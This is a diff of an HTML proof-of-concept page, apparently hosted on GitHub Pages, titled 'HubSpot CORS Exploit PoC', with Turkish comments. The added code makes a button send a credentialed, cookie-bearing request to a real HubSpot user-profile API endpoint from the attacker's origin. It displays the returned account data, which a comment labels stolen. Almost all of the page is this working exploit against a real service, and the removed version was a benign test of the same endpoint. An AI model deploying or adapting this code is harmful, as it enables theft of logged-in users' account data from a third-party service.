@@ -1,31 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - vukuff.github.io</title>
-    <script>
-        // Hedef API'ye istek gönder
-        fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7", {
-            method: "POST",
-            headers: {
-                "Content-Type": "text/plain",
-                "Origin": "https://vukuff.github.io"  // GitHub Pages origin'iniz
-            },
-            body: JSON.stringify({ 
-                project: "js",
-                message: "CORS test from vukuff.github.io" 
-            })
-        })
-        .then(response => {
-            console.log("Status:", response.status);
-            console.log("CORS Header:", response.headers.get("Access-Control-Allow-Origin"));
-            return response.text();
-        })
-        .then(data => console.log("Response:", data))
-        .catch(error => console.error("Error:", error));
-    </script>
+    <title>HubSpot CORS Test</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        pre { background: #f0f0f0; padding: 10px; }
+    </style>
 </head>
 <body>
-    <h1>CORS Test Running</h1>
-    <p>Check browser console (F12) for results.</p>
+    <h1>HubSpot CORS Exploit PoC</h1>
+    <button id="testBtn">VERİYİ ÇEK</button>
+    <pre id="result"></pre>
+
+    <script>
+        document.getElementById("testBtn").addEventListener("click", () => {
+            const resultEl = document.getElementById("result");
+            resultEl.textContent = "İstek gönderiliyor...";
+
+            // HASSAS VERİ ÇEKEN API
+            fetch("https://exceptions-eu1.hubspot.com/api/v3/users/me", {
+                method: "GET",
+                credentials: "include",  // Çerezleri gönder
+                headers: {
+                    "Origin": "https://vukuff.github.io",  // GitHub Pages origin'iniz
+                    "Accept": "application/json"
+                }
+            })
+            .then(res => {
+                resultEl.innerHTML = `STATUS: ${res.status}\nCORS HEADER: ${res.headers.get("Access-Control-Allow-Origin")}`;
+                return res.json();
+            })
+            .then(data => {
+                console.log("ÇALINAN VERİ:", data);  // Konsola yaz
+                resultEl.textContent += `\n\nVERİ:\n${JSON.stringify(data, null, 2)}`;
+            })
+            .catch(err => {
+                resultEl.textContent = "HATA: " + err.message;
+            });
+        });
+    </script>
 </body>
 </html>
